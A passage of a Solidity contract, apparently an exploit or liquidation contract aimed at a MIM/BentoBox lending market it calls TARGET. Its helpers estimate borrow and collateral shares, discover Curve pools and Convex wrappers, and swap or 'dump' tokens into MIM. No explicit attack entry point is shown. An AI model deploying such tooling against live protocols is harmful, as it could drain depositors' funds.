        IBentoBoxLike bento = IBentoBoxLike(TARGET.bentoBox());
        uint256 share = bento.balanceOf(token, address(this));
        if (share != 0) {
            bento.withdraw(token, address(this), address(this), 0, share);
        }
    }

    function _estimateBorrowAmount(uint256 part) internal view returns (uint256 amount) {
        (uint128 elastic, uint128 base) = TARGET.totalBorrow();
        if (part == 0 || base == 0) return 0;
        amount = (part * uint256(elastic)) / uint256(base);
        if ((part * uint256(elastic)) % uint256(base) != 0) amount += 1;
    }

    function _requiredCollateralShareForPart(uint256 part, uint256 rate) internal view returns (uint256 share) {
        if (part == 0 || rate == 0) return 0;
        uint256 borrowAmountForPart = _estimateBorrowAmount(part);
        uint256 collateralAmount = (borrowAmountForPart * TARGET.LIQUIDATION_MULTIPLIER() * rate)
            / (LIQUIDATION_MULTIPLIER_PRECISION * EXCHANGE_RATE_PRECISION);
        RebaseLike memory totals = IBentoBoxLike(TARGET.bentoBox()).totals(collateralToken);
        share = _toBase(totals, collateralAmount, false);
    }

    function _toBase(RebaseLike memory total, uint256 elastic, bool roundUp) internal pure returns (uint256 base) {
        if (total.elastic == 0) {
            base = elastic;
        } else {
            base = (elastic * uint256(total.base)) / uint256(total.elastic);
            if (roundUp && (base * uint256(total.elastic)) / uint256(total.base) < elastic) {
                base += 1;
            }
        }
    }

    function _probeAsset(address token) internal view returns (address assetToken) {
        assetToken = _readAddress(token, abi.encodeWithSignature("asset()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("token()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("underlying()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("stakingToken()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("depositToken()"));
        if (assetToken != address(0)) return assetToken;
        assetToken = _readAddress(token, abi.encodeWithSignature("want()"));
    }

    function _probeCurveLp(address token) internal view returns (address lpToken) {
        if (token == address(0)) return address(0);
        lpToken = _readAddress(token, abi.encodeWithSignature("curveLpToken()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("curveToken()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("lp_token()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("token()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("underlying()"));
        if (lpToken != address(0)) return lpToken;
        lpToken = _readAddress(token, abi.encodeWithSignature("asset()"));
    }

    function _probeCurvePool(address lpToken) internal view returns (address pool) {
        if (lpToken == address(0)) return address(0);
        pool = _readAddress(lpToken, abi.encodeWithSignature("minter()"));
        if (pool != address(0)) return pool;
        pool = _readAddress(lpToken, abi.encodeWithSignature("pool()"));
        if (pool != address(0)) return pool;
        pool = _readAddress(lpToken, abi.encodeWithSignature("swap()"));
    }

    function _readAddress(address target, bytes memory data) internal view returns (address value) {
        (bool ok, bytes memory result) = target.staticcall(data);
        if (ok && result.length >= 32) value = abi.decode(result, (address));
    }

    function _routeExists(address router, address[] memory path) internal view returns (bool) {
        if (path.length < 2) return false;

        address factory;
        try IUniswapV2RouterLike(router).factory() returns (address resolvedFactory) {
            factory = resolvedFactory;
        } catch {
            return false;
        }

        if (!_isContract(factory)) return false;
        for (uint256 i = 0; i + 1 < path.length; i++) {
            if (IUniswapV2FactoryLike(factory).getPair(path[i], path[i + 1]) == address(0)) {
                return false;
            }
        }
        return true;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_RESET_FAILED");

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _wethPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _threeHopPath(address tokenIn, address mid, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](3);
        path[0] = tokenIn;
        path[1] = mid;
        path[2] = tokenOut;
    }

    function _isContract(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _trackedTokenBalance(address token) internal view returns (uint256) {
        if (token == address(0)) return 0;
        return IERC20Like(token).balanceOf(address(this));
    }

    function _preferredDumpToken() internal view returns (address token) {
        if (curveLpToken != address(0)) return curveLpToken;
        if (convexDepositToken != address(0) && convexDepositToken != collateralToken) return convexDepositToken;
        if (underlyingToken != address(0) && underlyingToken != collateralToken) return underlyingToken;
        return collateralToken;
    }

    function _bestDumpInventoryToken() internal view returns (address token) {
        uint256 curveBal = _trackedTokenBalance(curveLpToken);
        if (curveBal != 0) return curveLpToken;
        uint256 convexBal = _trackedTokenBalance(convexDepositToken);
        if (convexBal != 0) return convexDepositToken;
        uint256 underlyingBal = _trackedTokenBalance(underlyingToken);
        if (underlyingBal != 0) return underlyingToken;
        if (IERC20Like(collateralToken).balanceOf(address(this)) != 0) return collateralToken;
        return address(0);
    }

    function _dumpCurveLpToMim(address lpToken) internal returns (bool) {
        if (lpToken == address(0)) return false;
        uint256 lpBalance = IERC20Like(lpToken).balanceOf(address(this));
        if (lpBalance == 0) return false;

        address pool = curvePool;
        if (pool == address(0)) pool = _probeCurvePool(lpToken);
        if (!_isContract(pool)) return false;

        uint256[6] memory priorities = [uint256(0), 1, 2, 3, 4, 5];
        for (uint256 p = 0; p < priorities.length; p++) {
            uint256 i = priorities[p];
            address coin = _curveCoin(pool, i);
            if (coin == address(0)) continue;
            if (!_looksSwappable(coin)) continue;
            uint256 beforeCoin = IERC20Like(coin).balanceOf(address(this));
            if (_removeLiquidityOneCoin(pool, lpToken, lpBalance, i)) {
                uint256 afterCoin = IERC20Like(coin).balanceOf(address(this));
                if (afterCoin > beforeCoin) {
                    if (coin == MIM) return true;
                    return _swapAllToMim(coin);
                }
            }
        }
        return false;
    }

    function _removeLiquidityOneCoin(address pool, address lpToken, uint256 amount, uint256 index) internal returns (bool) {
        _forceApprove(lpToken, pool, amount);
        (bool ok,) = pool.call(abi.encodeWithSignature("remove_liquidity_one_coin(uint256,int128,uint256)", amount, int128(int256(index)), 0));
        if (ok) return true;
        (ok,) = pool.call(abi.encodeWithSignature("remove_liquidity_one_coin(uint256,uint256,uint256)", amount, index, 0));
        if (ok) return true;
        (ok,) = pool.call(abi.encodeWithSignature("remove_liquidity_one_coin(uint256,int128,uint256,bool)", amount, int128(int256(index)), 0, false));
        return ok;
    }

    function _curveCoin(address pool, uint256 index) internal view returns (address coin) {
        coin = _readAddress(pool, abi.encodeWithSignature("coins(uint256)", index));
        if (coin != address(0)) return coin;
        coin = _readAddress(pool, abi.encodeWithSignature("underlying_coins(uint256)", index));
    }

    function _looksSwappable(address token) internal pure returns (bool) {
        return token == MIM || token == WETH || token == WBTC || token == USDC || token == USDT || token == DAI;
    }

    function _buildCollateralFromMimViaCurve(uint256 collateralNeeded) internal returns (bool) {
        if (curveLpToken == address(0) || curvePool == address(0) || convexDepositToken == address(0)) return false;
        uint256 mimBalance = IERC20Like(MIM).balanceOf(address(this));
        if (mimBalance == 0) return false;

        if (!_swapExactInputPreferred(SUSHI_ROUTER, MIM, USDT, mimBalance) && !_swapExactInputPreferred(UNISWAP_V2_ROUTER, MIM, USDT, mimBalance)) {
            return false;
        }

        uint256 usdtBal = IERC20Like(USDT).balanceOf(address(this));
        if (usdtBal == 0) return false;
        if (!_addLiquidityOneCoin(curvePool, USDT, usdtBal, curveLpToken)) return false;

        if (_trackedTokenBalance(convexDepositToken) == 0 && !_wrapCurveLpToConvex()) return false;
        if (IERC20Like(collateralToken).balanceOf(address(this)) >= collateralNeeded) return true;
        return _wrapConvexToCollateral();
    }

    function _addLiquidityOneCoin(address pool, address coin, uint256 amount, address lpToken) internal returns (bool) {
        _forceApprove(coin, pool, amount);

        for (uint256 i = 0; i < 6; i++) {
            address discovered = _curveCoin(pool, i);
            if (discovered != coin) continue;

            uint256 beforeLp = IERC20Like(lpToken).balanceOf(address(this));
            if (i < 2) {
                uint256[2] memory amounts2;
                amounts2[i] = amount;
                (bool ok2,) = pool.call(abi.encodeWithSignature("add_liquidity(uint256[2],uint256)", amounts2, 0));
                if (ok2 && IERC20Like(lpToken).balanceOf(address(this)) > beforeLp) return true;
            }
            if (i < 3) {
                uint256[3] memory amounts3;
                amounts3[i] = amount;
                (bool ok3,) = pool.call(abi.encodeWithSignature("add_liquidity(uint256[3],uint256)", amounts3, 0));
                if (ok3 && IERC20Like(lpToken).balanceOf(address(this)) > beforeLp) return true;
            }
            if (i < 4) {
                uint256[4] memory amounts4;
                amounts4[i] = amount;
                (bool ok4,) = pool.call(abi.encodeWithSignature("add_liquidity(uint256[4],uint256)", amounts4, 0));
                if (ok4 && IERC20Like(lpToken).balanceOf(address(this)) > beforeLp) return true;
            }
            if (i < 5) {
                uint256[5] memory amounts5;
                amounts5[i] = amount;
                (bool ok5,) = pool.call(abi.encodeWithSignature("add_liquidity(uint256[5],uint256)", amounts5, 0));
                if (ok5 && IERC20Like(lpToken).balanceOf(address(this)) > beforeLp) return true;
            }
        }
        return false;
    }

    function _wrapCurveLpToConvex() internal returns (bool) {
        if (curveLpToken == address(0) || convexDepositToken == address(0) || curveLpToken == convexDepositToken) {
            return false;
        }
        uint256 lpBalance = IERC20Like(curveLpToken).balanceOf(address(this));
        if (lpBalance == 0) return false;

        _forceApprove(curveLpToken, convexDepositToken, lpBalance);
        uint256 before = IERC20Like(convexDepositToken).balanceOf(address(this));
        (bool ok,) = convexDepositToken.call(abi.encodeWithSignature("deposit(uint256)", lpBalance));
        if (!ok) {
            (ok,) = convexDepositToken.call(abi.encodeWithSignature("deposit(uint256,address)", lpBalance, address(this)));
        }
        return ok && IERC20Like(convexDepositToken).balanceOf(address(this)) > before;
    }

    function _wrapConvexToCollateral() internal returns (bool) {
        if (convexDepositToken == address(0) || collateralToken == convexDepositToken) return false;
        uint256 bal = IERC20Like(convexDepositToken).balanceOf(address(this));
        if (bal == 0) return false;

        _forceApprove(convexDepositToken, collateralToken, bal);
        uint256 before = IERC20Like(collateralToken).balanceOf(address(this));
        (bool ok,) = collateralToken.call(abi.encodeWithSignature("deposit(uint256)", bal));
        if (!ok) {
            (ok,) = collateralToken.call(abi.encodeWithSignature("deposit(uint256,address)", bal, address(this)));
        }
        if (!ok) {
            (ok,) = collateralToken.call(abi.encodeWithSignature("stake(uint256)", bal));
        }
        return ok && IERC20Like(collateralToken).balanceOf(address(this)) > before;
    }
}
